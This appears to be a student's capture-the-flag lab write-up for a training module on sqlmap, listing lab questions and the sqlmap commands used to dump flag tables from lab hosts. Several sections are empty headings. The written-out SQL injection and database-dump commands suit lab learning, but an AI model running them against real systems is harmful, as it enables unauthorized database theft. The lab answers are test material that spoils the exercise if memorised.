# SQLMAP Essentials

## Building Attacks

### Running SQLMap in an HTTP Request

What's the contents of table flag2? (Case #2)

What's the contents of table flag3? (Case #3)

What's the contents of table flag4? (Case #4)

### Attack Tuning

What's the contents of table flag5? (Case #5)

`sqlmap -u "http://94.237.62.195:42450/case5.php?id=1" --level 5 --risk 3 --batch --tables --dump`

<figure><img src=".gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

What's the contents of table flag6? (Case #6)

``sqlmap -u "http://94.237.62.195:42450/case6.php?col=id" --prefix '`)' --batch --dump -D testdb -T flag6``

<figure><img src=".gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

What's the contents of table flag7? (Case #7)

* UNION snenanigans

`sqlmap -u "http://94.237.62.195:42450/case7.php?id=1" -v --level 5 --risk 3 --dump`

## Database Enumeration

### DB Enum

`sqlmap -u "http://83.136.250.104:37078/case1.php?id=1" --dump -T flag1 -D testdb`

<figure><img src=".gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

### Advanced DB Enum

## Advanced SQLMap Usage

### Bypassing Web Application Protections

### OS Exploitation

## Skills Assessment
